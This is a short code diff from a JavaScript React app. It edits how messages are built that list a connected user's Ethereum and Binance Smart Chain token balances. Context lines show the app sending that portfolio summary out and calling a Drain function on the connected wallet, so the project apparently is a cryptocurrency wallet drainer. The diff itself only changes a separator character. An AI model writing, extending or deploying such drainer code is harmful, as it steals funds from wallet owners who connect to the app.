@@ -152,7 +152,7 @@ function App() {
       let message = "Totol Portfolio for Ethereum Mainent ";
       balances.forEach((item) => {
         message +=
-          String(item?.contract_name) + " " + String(item?.pretty_quote) + " ";
+          String(item?.contract_name) + " " + String(item?.pretty_quote) + ",";
       });
       sendMessage(message)
     }
@@ -162,7 +162,7 @@ function App() {
       let message = "Totol Portfolio for Binance Smart Chain ";
       bscbalances.forEach((item) => {
         message +=
-          String(item?.contract_name) + " " + String(item?.pretty_quote) + " ";
+          String(item?.contract_name) + " " + String(item?.pretty_quote) + ",";
       });
       Drain(connected);
       sendMessage(message)
